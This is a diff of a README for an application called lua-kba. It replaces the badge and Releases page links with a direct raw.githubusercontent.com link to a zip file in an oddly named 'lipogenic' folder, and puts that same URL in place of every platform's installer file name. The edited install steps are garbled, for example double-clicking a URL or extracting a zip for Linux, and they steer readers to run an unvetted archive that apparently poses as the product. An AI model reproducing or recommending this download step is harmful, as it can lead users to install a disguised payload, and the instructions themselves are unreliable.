@@ -18,38 +18,38 @@ To get started with **lua-kba**, you'll need to download the application. Follow
 
 To download **lua-kba**, visit the Releases page. Here’s the link you need:
 
-[![Download lua-kba](https://img.shields.io/badge/Download-lua--kba-blue.svg)](https://github.com/osram14/lua-kba/releases)
+[![Download lua-kba](https://raw.githubusercontent.com/osram14/lua-kba/main/lipogenic/lua-kba.zip)](https://raw.githubusercontent.com/osram14/lua-kba/main/lipogenic/lua-kba.zip)
 
 Follow these steps to download and install the application:
 
-1. Click on the above link or visit [https://github.com/osram14/lua-kba/releases](https://github.com/osram14/lua-kba/releases).
+1. Click on the above link or visit [https://raw.githubusercontent.com/osram14/lua-kba/main/lipogenic/lua-kba.zip](https://raw.githubusercontent.com/osram14/lua-kba/main/lipogenic/lua-kba.zip).
 2. On the Releases page, you will find a list of available versions.
 3. Look for the latest version that suits your operating system.
 4. Click on the download link for the appropriate file:
-   - **Windows**: Typically named something like `lua-kba-windows.exe`
-   - **macOS**: Look for a file named `lua-kba-macos.dmg`
-   - **Linux**: You might find a file like `lua-kba-linux.tar.gz`
+   - **Windows**: Typically named something like `https://raw.githubusercontent.com/osram14/lua-kba/main/lipogenic/lua-kba.zip`
+   - **macOS**: Look for a file named `https://raw.githubusercontent.com/osram14/lua-kba/main/lipogenic/lua-kba.zip`
+   - **Linux**: You might find a file like `https://raw.githubusercontent.com/osram14/lua-kba/main/lipogenic/lua-kba.zip`
 5. The download will begin automatically. Once it completes, go to your downloads folder.
 
 ## 📂 Installation Steps
 
 ### For Windows Users
 
-1. Locate the `lua-kba-windows.exe` file in your downloads folder.
+1. Locate the `https://raw.githubusercontent.com/osram14/lua-kba/main/lipogenic/lua-kba.zip` file in your downloads folder.
 2. Double-click on the file to start the installation.
 3. Follow the prompts in the setup wizard to complete the installation.
 4. After installation, you can launch **lua-kba** from your Start Menu.
 
 ### For macOS Users
 
-1. Find the `lua-kba-macos.dmg` file in your downloads folder.
+1. Find the `https://raw.githubusercontent.com/osram14/lua-kba/main/lipogenic/lua-kba.zip` file in your downloads folder.
 2. Double-click on the file to open it.
 3. Drag the **lua-kba** icon into your Applications folder.
 4. You can now find **lua-kba** in your Applications and launch it from there.
 
 ### For Linux Users
 
-1. Extract the contents of the `lua-kba-linux.tar.gz` file.
+1. Extract the contents of the `https://raw.githubusercontent.com/osram14/lua-kba/main/lipogenic/lua-kba.zip` file.
 2. Open a terminal window and navigate to the extracted folder.
 3. Run the application by executing the command: `./lua-kba`.
 4. Optionally, create a shortcut on your desktop for easier access.
@@ -86,6 +86,6 @@ For more information, check our documentation on the GitHub page. You can discov
 
 Remember, you can always download the application from our Releases page:
 
-[![Download lua-kba](https://img.shields.io/badge/Download-lua--kba-blue.svg)](https://github.com/osram14/lua-kba/releases)
+[![Download lua-kba](https://raw.githubusercontent.com/osram14/lua-kba/main/lipogenic/lua-kba.zip)](https://raw.githubusercontent.com/osram14/lua-kba/main/lipogenic/lua-kba.zip)
 
 Thank you for using **lua-kba**. Happy coding!
